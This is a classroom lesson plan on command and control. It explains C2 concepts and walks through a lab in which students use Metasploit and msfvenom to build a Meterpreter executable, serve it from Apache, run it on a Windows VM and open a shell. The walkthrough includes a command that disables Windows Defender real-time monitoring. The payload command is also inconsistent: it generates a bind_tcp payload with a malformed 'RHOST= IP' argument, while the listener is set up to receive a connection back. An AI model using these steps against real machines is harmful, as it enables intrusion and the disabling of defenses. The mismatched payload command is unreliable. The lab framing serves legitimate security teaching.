## 1.3 Lesson Plan: Command and Control

#### Overview

 In today's lesson, we start by learning what command and control (C2) is and how it's used by malicious actors in order to communicate with computers they control or have compromised.

#### Class Objectives

By the end of class, students will be able to:

- Explain what C2 is and how it fits in an offensive security operation

- Use Metasploit to generate a malicious executable with `msfvenom` and establish a connection back to their C2 server

- Perform basic reconnassiance with Meterpreter

### Lab Environment

Students will use their Kali virtual machine to act as the C2 "server" and run their generated malicious executable on the Windows 10 virtual machine. 

### Slideshow and Timetracker

The lesson slides are available on Google Drive here: [1.2 Slides](https://docs.google.com/presentation/d/1AUuAjxX7_oIm5TOJHHXP6qROy8kmxuhMzVqyov3RVNs/edit?usp=sharing)

### 01. Instructor Do: C2 Architecture and the Metasploit Framework
 
Welcome students back to class and explain that today we will be learning what a command and control framework is and how it's used in an offensive operation. We will also introduce students to their first C2 framework, Metasploit.

`Note:` Metasploit is considered both an exploitation and Command and Control framework, where most C2 platforms today are just C2 frameworks (No exploitation).

Students should have an understanding of the cyber 'kill chain' in which today we will explore how the command and control architecture assists throughout the process. 

When an attacker compromises a computer, they directly control that machine. Throughout the cyber kill chain, an attacker will compromise several machines, which means several machines are then communicating with that single attacking machine. This is know as 'command and control'.

In a traditional C2 architecture, multiple compromised machines, also known as "zombies", communicate with a single C2 'framework', hosted on a machine. 

- C2 architecture has evolved signficiantly over the past decade so that the true C2 server is concealed through various methods, instead of a direct Server -> Host architecture.

- In order to communicate back to the C2 server, the compromised machine must run an 'agent', which typically is a malicious executable or code that runs on the target machine.

- Most C2 frameworks support multiple different ways of connectivity, also known as "channels".

A compromised host can communicate using either a single channel or several channels over various protocols. Some of these protocols include

- DNS
- HTTP
- HTTPS
- TCP (Arbritary port)
- SMB

The protocol being used is dependent on the target's network firewall egress rules. Typically, most egress rules allow HTTP/S and DNS outbound, which is why those channels are commonly used for C2 communication.

While under the control of a C2 server, a zombie will periodically communicate back with the C2 server to 'check-in' for any updates. This is commonly referred to as a 'heartbeat'. Whenever a compromised computer checks in with the C2 server, it will do two things.

1) Let the server know the malicious process is still running
2) Ask for any instructions 

When the compromised computer asks for any instructions, it's asking if any commands need to be executed. 

For example, if the operator of the C2 server issues a command, `pwd`, to the compromised machine, that command is only run when the compromised machine checks-in with the C2 server. This interval is commonly able to be changed and is depedant on the C2 framework being used.

The C2 framework we will be using for this class is Metasploit. Metasploit is both a C2 and exploit framework, supporting a variety of different payloads. 

- Metasploit will be heavily used during this module, however we are simply introducing them to Meterpreter to demonstrate how C2 works.

- We will cover the capabilities of the 'Meterpreter' shell later in the course.

### 02. Student Do: Command and Control Framework research

In this activity, students will research various C2 frameworks and document similiarities and differences between them

Share the following link with students: https://www.thec2matrix.com/matrix


### 03. Instructor Do: Metasploit Framework and msfvenom

Remind students that as shown in their research activity, there are many choices for C2. In this class, however, we will be focusing on using Metasploit.

- Metasploit is a tool that has been around for quite a bit and owned by the company Rapid 7. 

- There's a free version, which is what comes installed on Kali by default, and a professional version, which expands on it's exploitation and C2 capabilities

Metasploit has an additional component, msfvenom, which allows the operator to craft the malicious agents and payloads that will be used to communicate back with Metasploit.

### 04. Instructor Do: Metasploit and msfvenom demonstration

1. Login to the Kali machine with credentials `root/toor`

2. Click on the Metasploit icon on the taskbar

Explain to students that unlike most C2 frameworks, Metasploit is purely commandline based and has no web application or GUI. 

3. Once metasploit is started, type `use exploit/multi/handler` 

Explain to students that in order for the payload/agent we're going to craft to communicate back to Metasploit, we need to start something called a 'listener' that "listens" for the payload to talk back.

- Without starting a listener, the C2 server will not be able to communicate with any agents.

- Metasploit works through its use of "modules". In this case, we're using the `exploit/multi/handler` module which is Metasploit's listener module.

4. Type `ip addr` to get the IP address of the Kali machine, then type `set LHOST <kali ip address>`

5. After the LHOST (listener host) is set, set the LPORT by typing `set LPORT 4444`

![](/Images/01.Metasploitoptions.PNG)

6. Once LPORT and LHOST is set, start the listener by typing `run -j`. The `-j` option sets it to run in background.

7. Next, generate the agent/payload by typing `msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe` 

![](/Images/02.Metasploitmsfvenom.png)

8. Clear out the /var/www/html/ folder: `rm /var/www/html/*`

9. Move the payload to /var/www/html: `mv shell.exe /var/www/html/`

10. Start the apache web service by typing `service apache2 start`

![](/Images/03.apache.png)

11. Now move from your Kali VM to your Windows VM. Open an web browser and browse to your Kali's IP address. Download the `shell.exe` payload and execute it.

- Note: Windows Defender should be turned off. If not turned off, open PowerShell as administrator and run `Set-MPPreference -DisableRealTimeMonitoring $true` 

![](/Images/04.Windows.png)

12. Back in Kali, you should see a message "Meterpreter Session 1 opened". To interact with this session, type `sessions -i 1`

![](/Images/05.Session.png)

13. You now have a shell into the Windows machine, with Metasploit operating as the C2 server. Demonstrate commands such as `ls` and `pwd` to show you're on the Windows machine.

![](/Images/06.Command.png)

We will explore the capabilities of the Meterpreter shell later in the course. 

### 05. Student Do: Metasploit and MSFVenom

In this activity, students will follow in the instructor's footpath and use Metasploit and MSFvenom to open a shell on their Windows VM.

